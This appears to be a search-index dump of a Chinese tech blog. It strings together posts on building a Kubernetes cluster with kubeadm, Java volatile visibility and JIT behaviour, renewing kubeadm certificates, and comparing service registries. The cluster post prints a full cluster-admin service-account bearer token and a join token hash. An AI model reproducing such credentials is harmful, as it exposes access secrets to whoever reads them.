/etc/sysctl.d/k8s.conf net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 EOF sysctl --system [su_highlight]注意: 至此, 以上的全部操作, 在Worker机器上也需要执行. 注意hostname等不要相同.[/su_highlight]\n7. 初始化Master [root@k8s-master ~]$ kubeadm config print init-defaults \u0026gt; kubeadm-init.yaml 该文件有两处需要修改:\n将advertiseAddress: 1.2.3.4修改为本机地址 将imageRepository: k8s.gcr.io修改为imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers\napiVersion: kubeadm.k8s.io/v1beta2 bootstrapTokens: - groups: - system:bootstrappers:kubeadm:default-node-token token: abcdef.0123456789abcdef ttl: 24h0m0s usages: - signing - authentication kind: InitConfiguration localAPIEndpoint: advertiseAddress: 172.17.0.14 bindPort: 6443 nodeRegistration: criSocket: /var/run/dockershim.sock name: k8s-master taints: - effect: NoSchedule key: node-role.kubernetes.io/master --- apiServer: timeoutForControlPlane: 4m0s apiVersion: kubeadm.k8s.io/v1beta2 certificatesDir: /etc/kubernetes/pki clusterName: kubernetes controllerManager: {} dns: type: CoreDNS etcd: local: dataDir: /var/lib/etcd imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers kind: ClusterConfiguration kubernetesVersion: v1.15.0 networking: dnsDomain: cluster.local serviceSubnet: 10.96.0.0/12 scheduler: {} 下载镜像：\n[root@k8s-master ~]$ kubeadm config images pull --config kubeadm-init.yaml 执行初始化：\n[root@k8s-master ~]$ kubeadm init --config kubeadm-init.yaml 等待执行完毕后, 会输出如下内容：\nYour Kubernetes control-plane has initialized successfully! To start using your cluster, you need to run the following as a regular user: mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config You should now deploy a pod network to the cluster. Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: https://kubernetes.io/docs/concepts/cluster-administration/addons/ Then you can join any number of worker nodes by running the following on each as root: kubeadm join 172.17.0.14:6443 --token abcdef.0123456789abcdef \\  --discovery-token-ca-cert-hash sha256:e245251e3de01986694f77319827481ed8669be6ba2ccc23a29596072b275346 最后两行需要保存下来, kubeadm join \u0026hellip;是worker节点加入所需要执行的命令.\n接下来配置环境, 让当前用户可以执行kubectl命令:\nmkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config 测试一下: 此处的NotReady是因为网络还没配置.\n[root@k8s-master kubernetes]$ kubectl get node NAME STATUS ROLES AGE VERSION k8s-master NotReady master 3m25s v1.15.3 8. 配置网络 下载描述文件：\n[root@k8s-master ~]$ wget https://docs.projectcalico.org/v3.15/manifests/calico.yaml [root@k8s-master ~]$ cat kubeadm-init.yaml | grep serviceSubnet: serviceSubnet: 10.96.0.0/12 打开calico.yaml, 将192.168.0.0/16修改为10.96.0.0/12\n[su_highlight]需要注意的是, calico.yaml中的IP和kubeadm-init.yaml需要保持一致, 要么初始化前修改kubeadm-init.yaml, 要么初始化后修改calico.yaml.[/su_highlight]\n执行kubectl apply -f calico.yaml初始化网络.\n此时查看node信息, master的状态已经是Ready了.\n[root@k8s-master ~]$ kubectl get node NAME STATUS ROLES AGE VERSION k8s-master Ready master 15m v1.15.3 9. 安装Dashboard 91. 部署Dashboard [root@k8s-master ~]$ wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml [root@k8s-master ~]$ kubectl apply -f recommended.yaml 部署完毕后, 执行kubectl get pods --all-namespaces查看pods状态\n[root@k8s-master kubernetes]$ kubectl get pods --all-namespaces | grep dashboard NAMESPACE NAME READY STATUS kubernetes-dashboard dashboard-metrics-scraper-fb986f88d-m9d8z 1/1 Running kubernetes-dashboard kubernetes-dashboard-6bb65fcc49-7s85s 1/1 Running 9.2 创建用户 创建一个用于登录Dashboard的用户. 创建文件dashboard-adminuser.yaml内容如下:\napiVersion: v1 kind: ServiceAccount metadata: name: admin-user namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: admin-user roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-admin subjects: - kind: ServiceAccount name: admin-user namespace: kube-system 执行命令kubectl apply -f dashboard-adminuser.yaml.\n9.3 生成证书 [root@k8s-master ~]$ grep \u0026#39;client-certificate-data\u0026#39; ~/.kube/config | head -n 1 | awk \u0026#39;{print $2}\u0026#39; | base64 -d \u0026gt;\u0026gt; kubecfg.crt [root@k8s-master ~]$ grep \u0026#39;client-key-data\u0026#39; ~/.kube/config | head -n 1 | awk \u0026#39;{print $2}\u0026#39; | base64 -d \u0026gt;\u0026gt; kubecfg.key [root@k8s-master ~]$ openssl pkcs12 -export -clcerts -inkey kubecfg.key -in kubecfg.crt -out kubecfg.p12 -name \u0026#34;kubernetes-client\u0026#34; 第三条命令生成证书时会提示输入密码, 可以直接两次回车跳过.\nkubecfg.p12即需要导入客户端机器的证书. 将证书拷贝到客户端机器上, 导入即可. chrome浏览器按下图所示导入：\n此时我们可以登录面板了, 访问地址: https://{k8s-master-ip}:6443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/#/login\n9.4 登录Dashboard 执行kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}'), 获取Token.\n[root@k8s-master ~]# kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk \u0026#39;{print $1}\u0026#39;) Name: admin-user-token-6mpx4 Namespace: kube-system Labels: \u0026lt;none\u0026gt; Annotations: kubernetes.io/service-account.name: admin-user kubernetes.io/service-account.uid: cabcc858-826a-4236-8514-51f473bf7752 Type: kubernetes.io/service-account-token Data ==== ca.crt: 1025 bytes namespace: 11 bytes token: eyJhbGciOiJSUzI1NiIsImtpZCI6Iks2dmRwalB5SWNKbWJTVUUxanVlVlAwbTk1OHR6QzhfN0FOZUw0V3huM0UifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLTZtcHg0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJjYWJjYzg1OC04MjZhLTQyMzYtODUxNC01MWY0NzNiZjc3NTIiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06YWRtaW4tdXNlciJ9.jHAzmmOBRn5tfZBeukORLm--9_q879fTHPDzjjyCm42MbHP0TFrgbo2A8ZmN0Od4qe9rTHiD9pJl3BtUQ06pIMsly7LvENnuLAxGuK3oDqc5FCdqb8L-f9-9HmBo7nEAMy67i6Cv9TjfD9790ejfOg6ZI0PC8MDXInxSgY97hlwBlyJh_M5zz8SMnOOnMYyr8UFmHRZJjTO5pdIs7cdVBxLz27wzw4h0svJyOsi9MBqHskN6Hq7KOsEYP5wyDHXmU_iHqQJH64R9DA6dpHx6v3qV1dyhtXJE9tZECsvoVtvNlKQ-VirtX4sJX29a5wAXDqkcysDiClIXZGZKtg8tFw 复制该Token到登录页, 点击登录即可, 效果如下:\n10. 添加Node节点 执行如下命令将Worker加入集群:\nkubeadm join 172.17.0.14:6443 --token abcdef.0123456789abcdef \\  --discovery-token-ca-cert-hash sha256:e245251e3de01986694f77319827481ed8669be6ba2ccc23a29596072b275346 注意: 此处的秘钥是初始化Master后生成的, 参考前文.\n如果token过期，使用如下命令重新生成：\nkubeadm token create --print-join-command 参考连接：kubeadm 生成的token过期后，集群增加节点 如果join时报错：[ERROR FileContent--proc-sys-net-ipv4-ip_forward]: /proc/sys/net/ipv4/ip_forward contents are not set to 1 执行如下命令：\necho \u0026#34;1\u0026#34;\u0026gt;/proc/sys/net/ipv4/ip_forward 参考链接：kubernetes 加入子节点 添加完毕后, 在Master上查看节点状态:\n[root@k8s-master ~]# kubectl get node NAME STATUS ROLES AGE VERSION k8s-master Ready master 125m v1.18.4 k8s-node1 Ready \u0026lt;none\u0026gt; 97m v1.18.4 k8s-node2 Ready \u0026lt;none\u0026gt; 95m v1.18.4 在面板上也可查看:\n配置node节点，以便node节点能够执行类似kubectl get node的时候不至于报The connection to the server localhost:8080 was refused - did you specify the right host or port?\n在node节点上执行：\nmkdir -p $HOME/.kube cp -i /etc/kubernetes/kubelet.conf $HOME/.kube/config chown $(id -u):$(id -g) $HOME/.kube/config //如果你本身是root用户，可以不执行 参考链接 https://juejin.im/post/5d7fb46d5188253264365dcf ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BAk8s/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"从零搭建K8S"},{"categories":["编程思想"],"content":"背景 这篇文章最开始再我的群里面有讨论过，当时想写的这篇文章的，但是因为一些时间的关系所以便没有写。最近阅读微信文章的时候发现了一篇零度写的一篇文章《分享一道阿里Java并发面试题》，对于有关Java并发性技术的文章我一般还是挺感兴趣的，于是阅读了一下，整体来说还是挺不错的，但是其中犯了一个验证可见性的问题。由于微信文章回复不方便讨论，于是我便把之前一些和群友的讨论在这里写出来。\n如何测试可见性问题 因为在群里面我们习惯的有每周一问，也就由我或者群友发现一些由意思的问题然后提问给大家，让大家参与讨论，当时我提出了一个如何测试vlolatile可见性的问题，首先在Effective Java给出了一个测试volatile可见性的例子:\nimport java.util.concurrent.*; public class Test { private static /*volatile*/ boolean stop = false; public static void main(String[] args) throws Exception { Thread t = new Thread(new Runnable() { public void run() { int i = 0; while (!stop) { i++; // System.out.println(\u0026#34;hello\u0026#34;);  } } }); t.start(); Thread.sleep(1000); TimeUnit.SECONDS.sleep(1); System.out.println(\u0026#34;Stop Thread\u0026#34;); stop = true; } } 这里大家可以复制上面的代码，你会发现这里程序永远不会结束，在零度的那篇文章中也给出了一个测试可见性的例子:\npublic class ThreadSafeCache { int result; public int getResult() { return result; } public synchronized void setResult(int result) { this.result = result; } public static void main(String[] args) { ThreadSafeCache threadSafeCache = new ThreadSafeCache(); for (int i = 0; i \u0026lt; 8; i++) { new Thread(() -\u0026gt; { int x = 0; while (threadSafeCache.getResult() \u0026lt; 100) { x++; } System.out.println(x); }).start(); } try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } threadSafeCache.setResult(200); } } 这里大家也可以运行一下这里是不会结束的。\n然而这两个例子真的是测试可见性的？我们先不着急下定论，首先我们来看看何为可见性，这里为了防止自己的一些片面之词，查阅了一些资料可以发现可见性的定义总体来说可以定义为:\n 当一个线程修改了共享变量后，其他线程能够立即得知这个修改。\n 可见性的定义比较简单，那怎么去实现呢？一般来说可见性会通过缓存一致性协议来完成，这里有篇文章讲CPU缓存一致性协议讲得不错:https://www.cnblogs.com/yanlong300/p/8986041.html，我这里直接借用他的图片,\n CPU A 计算完成后发指令需要修改x. CPU A 将x设置为M状态（修改状态）并通知缓存了x的CPU B, CPU B将本地cache b中的x设置为I状态(无效状态) CPU A 对x进行赋值 CPU B 发现x是失效的这个时候会进行回刷操作  可以看见我们的一致性协议会有一定的时间延迟，但是我们的可见性的目的是立即读到最新的，所以我们这里会将无效状态通知到其他拥有该缓存数据的CPU缓存中，并且等待确认，我们vlolatile也是采用这种方式达到可见性的，当然更多的细节你可以直接阅读上面推荐的文章。\n我们又回到我们的测试用例，可以发现我们的while循环是一个死循环，但是我们的缓存一致性协议是一定时间延迟，虽然这个一定时间并不保证，但是在现代的电脑系统上尤其是你自己的机器上，刷新一个缓存这点小时间还是有的吧。\n并且我们验证可见性的时候似乎违背了我们初衷，可见性的定义是立即读到最新的，但是我们却在强调我们的测试程序会出现死循环，那我们不就是验证的是永远都读不到最新的吗？\n通过上面的种种论述我们发现我们可见性的验证似乎出了一点问题。\n推翻验证程序 我们这里只需要一行代码就可以推翻我们上面的验证程序，我们用第二个验证程序:\n只添加了一句打印我们的结果值,我们的程序却停止了:\n这个结果证明我们的其他线程是能获取到我们的更新后的结果值的，所以这里一定是有其他原因。\n真相大白 我们上面添加了一句话，并没有影响我们的逻辑，但是却产生了截然不同的结果，这个到底是怎么回事呢？首先我们能想到的是编译器优化，看看添加代码前和添加代码后，编译器编译之后的代码是什么，由于我们用的是idea直接打开idea的class文件会帮助我们做反编译。\n添加代码前:\n添加代码后:\n这里可以看见编译器已经将我们的while循环优化成for循环，在循环内部添加了一个输出语句，这里可以看见逻辑并没有太大的变化，可以看见不是我们的编译器作怪的问题，这种优化代码的问题还有一个元凶那就是JIT，由于我们的循环有很多次肯定会触发JIT编译优化。\n由于JIT编译优化有多个层级，这里我们只看最终的C2优化后的汇编代码,看JIT的汇编代码可以利用hsdis+JITWatch查看，这里我只用了hsdis打印在控制台上查看即可。这里需要添加一下JVM启动参数-XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly， 启动之后一大堆汇编代码，为了看这个查询了好多汇编指令终于是把它理顺了。\n0x0000000112f81ce8: cmp $0x64,%r10d 0x0000000112f81cec: jge 0x0000000112f81cfc ;*goto ; - ThreadSafeCache::lambda$main$0@14 (line 29) 0x0000000112f81cee: inc %ebx ; OopMap{rbp=Oop off=80} ;*goto ; - ThreadSafeCache::lambda$main$0@14 (line 29) 0x0000000112f81cf0: test %eax,-0xb001cf6(%rip) # 0x0000000107f80000 ;*goto ; - ThreadSafeCache::lambda$main$0@14 (line 29) ; {poll} 0x0000000112f81cf6: jmp 0x0000000112f81cee 上面的这么多行代码都是我们下面:这段代码的翻译:\nwhile (threadSafeCache.getResult() \u0026lt; 100) { x++; } 解释一下汇编的代码:\n Step 1：比较threadSafeCache.getResult() 和100的大小 Step 2: threadSafeCache.getResult()如果大于等于100，跳转至0x0000000112f81cfc,也就是循环外的代码。 Step 3: 如果小于，那么执行x++操作。 Step 4: 检查安全点checkpoint,这里不是逻辑代码不需要太关注。 Step 5: 跳转至我们的Step3处。  可以看见我们上面的代码Step3-5之间形成了死循环，其实我们的代码翻译过来可以看作下面的代码：\nif(threadSafeCache.getResult() \u0026lt; 100){ while(true){ x++; } } 可以看见我们的整段代码只执行了这一次get逻辑，有可能get的时候我们主线程还没有执行set。 为什么里面加了一段打印之后就不会有这样的效果呢？我的猜测是如果在我们print中有sync加锁操作，jit会取消这种激进的优化，当然我们的变量如果是volatile也会有这样的效果，我们添加volatile的jit的汇编代码如下：\n可以发现这里没有做激进的优化而是每次都会获取新的值，来进行比较。\n总结 到最后，我也没有提及，如何去测试可见性，因为这个东西理论上来说无法去测试，因为有一个很重要的一点我们没法确定线程的执行顺序，当然也有确定的方式，那就是加一个同步器，可以是锁，可以是信号量，让我们的读取操作,在我们写操作之后，还有读操作一定是一次，不能使用循环，我尝试着按照这个思路去写：\npublic class Test { private static /*volatile*/ boolean stop = false; public static void main(String[] args) throws Exception { CountDownLatch countDownLatch = new CountDownLatch(1); Thread t = new Thread(new Runnable() { public void run() { try { countDownLatch.await(); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(stop); } }); t.start(); Thread.sleep(1000); TimeUnit.SECONDS.sleep(1); System.out.println(\u0026#34;Stop Thread\u0026#34;); stop = true; countDownLatch.countDown(); } } 上面这个程序没有加volatile,那么输出结果是有一定可能是false的但是发现，所有结果是true，其实这种方式没法去测试，因为我们外加了同步器而我们的同步器会带来读写屏障的加入，如果是读屏障那么会告诉处理器在执行任何的加载前，先应用所有已经在失效队列中的失效操作的指令，也就是会执行失效，回刷缓存。\n所以验证可见性的确没有一个很好的例子，我们只需要知道如果没有其他保障(读写屏障等)，有可能不能获取到最新的数据，但是其最终会获取到更新的数据，这个也很像我们分布式一致性中的最终一致性。\n最后大家也可以看看零度的这篇文章：https://mp.weixin.qq.com/s/i9ES7u5MPWCv1n8jYU_q_w，其中的对内存屏障和happens-before也有一定的讲解。\n转自 你了解的可见性可能是错的！ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%9A%84%E5%8F%AF%E8%A7%81%E6%80%A7%E5%8F%AF%E8%83%BD%E6%98%AF%E9%94%99%E7%9A%84/","series":["Manual"],"tags":["Java"],"title":"你了解的可见性可能是错的"},{"categories":["云原生"],"content":"使用kubeadm更新k8s证书 今天操作k8s的时候，突然说证书无效：\nUnable to connect to the server: x509: certificate has expired or is not yet valid 通过 kubeadm alpha certs check-expiration 查看，确实是过期了：\n[root@k8s-master ~]# kubeadm alpha certs check-expiration [check-expiration] Reading configuration from the cluster... [check-expiration] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -oyaml\u0026#39; [check-expiration] Error reading configuration from the Cluster. Falling back to default configuration W0627 11:21:35.745166 8754 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; no apiserver Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; ca no apiserver-etcd-client Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; etcd-ca no apiserver-kubelet-client Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; ca no controller-manager.conf Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; no etcd-healthcheck-client Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; etcd-ca no etcd-peer Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; etcd-ca no etcd-server Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; etcd-ca no front-proxy-client Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; front-proxy-ca no scheduler.conf Jun 24, 2021 09:45 UTC \u0026lt;invalid\u0026gt; no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca Jun 22, 2030 09:45 UTC 8y no etcd-ca Jun 22, 2030 09:45 UTC 8y no front-proxy-ca Jun 22, 2030 09:45 UTC 8y no 那么接下来就是更新证书📄了：\n 下面的操作都是在 master 节点上进行\n   备份   //首先备份原有证书： [root@k8s-master ~]# mkdir /etc/kubernetes.bak [root@k8s-master ~]# cp -r /etc/kubernetes/pki/ /etc/kubernetes.bak [root@k8s-master ~]# cp /etc/kubernetes/*.conf /etc/kubernetes.bak //然后备份 etcd 数据目录： [root@k8s-master ~]# cp -r /var/lib/etcd /var/lib/etcd.bak  通过 kubeadm alpha certs renew all 更新证书   [root@k8s-master ~]# kubeadm alpha certs renew all [renew] Reading configuration from the cluster... [renew] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -oyaml\u0026#39; [renew] Error reading configuration from the Cluster. Falling back to default configuration W0627 13:06:09.974228 14219 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] certificate embedded in the kubeconfig file for the admin to use and for kubeadm itself renewed certificate for serving the Kubernetes API renewed certificate the apiserver uses to access etcd renewed certificate for the API server to connect to kubelet renewed certificate embedded in the kubeconfig file for the controller manager to use renewed certificate for liveness probes to healthcheck etcd renewed certificate for etcd nodes to communicate with each other renewed certificate for serving etcd renewed certificate for the front proxy client renewed certificate embedded in the kubeconfig file for the scheduler manager to use renewed  再次查看证书时间   [root@k8s-master ~]# kubeadm alpha certs check-expiration [check-expiration] Reading configuration from the cluster... [check-expiration] FYI: You can look at this config file with \u0026#39;kubectl -n kube-system get cm kubeadm-config -oyaml\u0026#39; CERTIFICATE EXPIRES RESIDUAL TIME CERTIFICATE AUTHORITY EXTERNALLY MANAGED admin.conf Jun 27, 2022 05:06 UTC 364d no apiserver Jun 27, 2022 05:06 UTC 364d ca no apiserver-etcd-client Jun 27, 2022 05:06 UTC 364d etcd-ca no apiserver-kubelet-client Jun 27, 2022 05:06 UTC 364d ca no controller-manager.conf Jun 27, 2022 05:06 UTC 364d no etcd-healthcheck-client Jun 27, 2022 05:06 UTC 364d etcd-ca no etcd-peer Jun 27, 2022 05:06 UTC 364d etcd-ca no etcd-server Jun 27, 2022 05:06 UTC 364d etcd-ca no front-proxy-client Jun 27, 2022 05:06 UTC 364d front-proxy-ca no scheduler.conf Jun 27, 2022 05:06 UTC 364d no CERTIFICATE AUTHORITY EXPIRES RESIDUAL TIME EXTERNALLY MANAGED ca Jun 22, 2030 09:45 UTC 8y no etcd-ca Jun 22, 2030 09:45 UTC 8y no 已经更新成功了。\n 查看kubectl是否可用   [root@k8s-master ~]# kubectl get pods error: You must be logged in to the server (Unauthorized) 还不可用，需要更新更新下 kubeconfig 文件。\n 通过 kubeadm init phase kubeconfig all 更新 kubeconfig 文件   [root@k8s-master ~]# kubeadm init phase kubeconfig all I0627 13:07:48.893885 15844 version.go:252] remote version is much newer: v1.21.2; falling back to: stable-1.18 W0627 13:07:50.865825 15844 configset.go:202] WARNING: kubeadm cannot validate component configs for API groups [kubelet.config.k8s.io kubeproxy.config.k8s.io] [kubeconfig] Using kubeconfig folder \u0026#34;/etc/kubernetes\u0026#34; [kubeconfig] Using existing kubeconfig file: \u0026#34;/etc/kubernetes/admin.conf\u0026#34; [kubeconfig] Using existing kubeconfig file: \u0026#34;/etc/kubernetes/kubelet.conf\u0026#34; [kubeconfig] Using existing kubeconfig file: \u0026#34;/etc/kubernetes/controller-manager.conf\u0026#34; [kubeconfig] Using existing kubeconfig file: \u0026#34;/etc/kubernetes/scheduler.conf\u0026#34;  将新生成的 admin 配置文件覆盖掉原本的 admin 文件:   [root@k8s-master ~]# mv $HOME/.kube/config $HOME/.kube/config.old [root@k8s-master ~]# cp -i /etc/kubernetes/admin.conf $HOME/.kube/config [root@k8s-master ~]# chown $(id -u):$(id -g) $HOME/.kube/config  再次验证证书时间   查看 apiserver 的证书的有效期来验证是否更新成功\n[root@k8s-master ~]# echo | openssl s_client -showcerts -connect 127.0.0.1:6443 -servername api 2\u0026gt;/dev/null | openssl x509 -noout -enddate notAfter=Jun 27 05:06:10 2022 GMT 查看命令是否可用\n[root@k8s-master ~]# kubectl get pod NAME READY STATUS RESTARTS AGE ceres-admin-server-deployment-7f9c4c697d-7pphh 2/2 Running 0 91d ceres-admin-web-deployment-7c8fb64f58-ft8xv 2/2 Running 2 192d ceres-app-server-deployment-65b6bb99f9-qlwb2 2/2 Running 0 91d ceres-jobs-server-deployment-bdcd669bb-284k5 2/2 Running 2 217d ceres-merchant-web-deployment-6c6b668b8d-5vtq5 2/2 Running 2 192d ceres-settled-merchant-deployment-5f74c8f46d-f982v 2/2 Running 2 213d details-v1-6c9f8bcbcb-pzkfm 2/2 Running 6 296d nfs-client-provisioner-6965c6967-6jv6c 2/2 Running 8 217d productpage-v1-7f9d9c48c8-kgtlw 2/2 Running 4 296d ratings-v1-65cff55fb8-vmj4z 2/2 Running 6 296d reviews-v1-d5b6b667f-9b7kw 2/2 Running 4 296d reviews-v2-784495d9bc-xvqpw 2/2 Running 6 296d reviews-v3-57fcb844b7-xsj47 2/2 Running 4 296d [root@k8s-master ~]# kubens  default ingress-nginx Istio-system kube-node-lease kube-public kube-system kube-wordpress kubernetes-dashboard tkb 参考链接🔗： 更新一个10年有效期的 Kubernetes 证书 使用 kubeadm 进行证书管理 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/%E4%BD%BF%E7%94%A8kubeadm%E6%9B%B4%E6%96%B0k8s%E8%AF%81%E4%B9%A6/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"使用kubeadm更新k8s证书"},{"categories":["其他"],"content":"使用Xshell登录AWS的EC2云服务器和开启EC2上允许root+密码方式登录 https://www.dwhd.org/20150525_182436.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/%E4%BD%BF%E7%94%A8xshell%E7%99%BB%E5%BD%95aws%E7%9A%84ec2%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%BC%80%E5%90%AFec2%E4%B8%8A%E5%85%81%E8%AE%B8root+%E5%AF%86%E7%A0%81%E6%96%B9%E5%BC%8F%E7%99%BB%E5%BD%95/","series":["Manual"],"tags":["Other"],"title":"使用Xshell登录AWS的EC2云服务器和开启EC2上允许root+密码方式登录"},{"categories":["编程思想"],"content":"全文索引 参考 什么是全文索引，为什么要使用全文索引 MySQL 之全文索引 浅谈mysql fulltext全文索引优缺点 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/other/%E5%85%A8%E6%96%87%E7%B4%A2%E5%BC%95/","series":["Manual"],"tags":["Other"],"title":"全文索引"},{"categories":["架构演进"],"content":"前言 服务注册中心本质上是为了解耦服务提供者和服务消费者。对于任何一个微服务，原则上都应存在或者支持多个提供者，这是由微服务的分布式属性决定的。更进一步，为了支持弹性扩缩容特性，一个微服务的提供者的数量和分布往往是动态变化的，也是无法预先确定的。因此，原本在单体应用阶段常用的静态LB机制就不再适用了，需要引入额外的组件来管理微服务提供者的注册与发现，而这个组件就是服务注册中心。\nCAP理论 CAP理论是分布式架构中重要理论\n 一致性(Consistency) (所有节点在同一时间具有相同的数据) 可用性(Availability) (保证每个请求不管成功或者失败都有响应) 分隔容忍(Partition tolerance) (系统中任意信息的丢失或失败不会影响系统的继续运作)  关于\nP的理解，我觉得是在整个系统中某个部分，挂掉了，或者宕机了，并不影响整个系统的运作或者说使用，而可用性是，某个系统的某个节点挂了，但是并不影响系统的接受或者发出请求，CAP 不可能都取，只能取其中2个\n原因是\n如果C是第一需求的话，那么会影响A的性能，因为要数据同步，不然请求结果会有差异，但是数据同步会消耗时间，期间可用性就会降低。\n如果A是第一需求，那么只要有一个服务在，就能正常接受请求，但是对与返回结果变不能保证，原因是，在分布式部署的时候，数据一致的过程不可能想切线路那么快。\n再如果，同事满足一致性和可用性，那么分区容错就很难保证了，也就是单点，也是分布式的基本核心，好了，明白这些理论，就可以在相应的场景选取服务注册与发现了\n服务注册中心解决方案 设计或者选型一个服务注册中心，首先要考虑的就是服务注册与发现机制。纵观当下各种主流的服务注册中心解决方案，大致可归为三类：\n  应用内：直接集成到应用中，依赖于应用自身完成服务的注册与发现，最典型的是Netflix提供的Eureka\n  应用外：把应用当成黑盒，通过应用外的某种机制将服务注册到注册中心，最小化对应用的侵入性，比如Airbnb的SmartStack，HashiCorp的Consul\n  DNS：将服务注册为DNS的SRV记录，严格来说，是一种特殊的应用外注册方式，SkyDNS是其中的代表\n   注1：对于第一类注册方式，除了Eureka这种一站式解决方案，还可以基于ZooKeeper或者Etcd自行实现一套服务注册机制，这在大公司比较常见，但对于小公司而言显然性价比太低。\n注2：由于DNS固有的缓存缺陷，本文不对第三类注册方式作深入探讨。\n 除了基本的服务注册与发现机制，从开发和运维角度，至少还要考虑如下五个方面：\n  测活：服务注册之后，如何对服务进行测活以保证服务的可用性？\n  负载均衡：当存在多个服务提供者时，如何均衡各个提供者的负载？\n  集成：在服务提供端或者调用端，如何集成注册中心？\n  运行时依赖：引入注册中心之后，对应用的运行时环境有何影响？\n  可用性：如何保证注册中心本身的可用性，特别是消除单点故障？\n  主流注册中心产品  软件产品特性并非一成不变，如果发现功能特性有变更，欢迎评论指正\n     Nacos Eureka Consul CoreDNS Zookeeper     一致性协议 CP+AP AP CP — CP   健康检查 TCP/HTTP/MYSQL/Client Beat Client Beat TCP/HTTP/gRPC/Cmd — Keep Alive   负载均衡策略 权重/ metadata/Selector Ribbon Fabio RoundRobin —   雪崩保护 有 有 无 无 无   自动注销实例 支持 支持 支持 不支持 支持   访问协议 HTTP/DNS HTTP HTTP/DNS DNS TCP   监听支持 支持 支持 支持 不支持 支持   多数据中心 支持 支持 支持 不支持 不支持   跨注册中心同步 支持 不支持 支持 不支持 不支持   SpringCloud集成 支持 支持 支持 不支持 支持   Dubbo集成 支持 不支持 支持 不支持 支持   K8S集成 支持 不支持 支持 支持 不支持      Consul是支持自动注销服务实例， 请见文档： https://www.consul.io/api-docs/agent/service ，在check的 DeregisterCriticalServiceAfter 这个参数\u0026ndash; 感谢@超帅的菜鸟博主提供最新信息 新版本的Dubbo也扩展了对 Consul 的支持。 参考: https://github.com/apache/dubbo/tree/master/dubbo-registry     Nacos、Eureka都支持雪崩保护，避免因为过多的实例不健康对健康的实例造成雪崩效应。\nNacos雪崩保护：为了防止因过多实例 (Instance) 不健康导致流量全部流向健康实例 (Instance) ，继而造成流量压力把健康实例 (Instance) 压垮并形成雪崩效应，应将健康保护阈值定义为一个 0 到 1 之间的浮点数。当域名健康实例占总服务实例的比例小于该值时，无论实例是否健康，都会将这个实例返回给客户端。这样做虽然损失了一部分流量，但是保证了集群的剩余健康实例 (Instance) 能正常工作。\nEureka雪崩保护：当网络分区故障发生时，微服务与Eureka 